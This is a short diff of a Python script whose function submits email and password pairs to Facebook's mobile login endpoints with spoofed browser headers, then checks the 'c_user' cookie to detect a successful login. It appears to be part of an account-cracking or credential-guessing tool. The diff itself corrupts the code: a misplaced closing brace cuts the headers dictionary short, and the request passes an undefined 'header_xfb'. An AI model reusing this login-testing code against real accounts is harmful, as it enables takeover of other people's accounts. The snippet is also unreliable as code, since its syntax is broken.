@@ -251,7 +251,7 @@ def free(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            headers = {'authority': 'free.facebook.com',
+            headers = {'authority': 'free.facebook.com',}
             'method': 'POST',
             'scheme': 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
@@ -265,7 +265,7 @@ def free(uid,pwx,tl):
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',}
+            'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
             lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,cache=header_xfb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
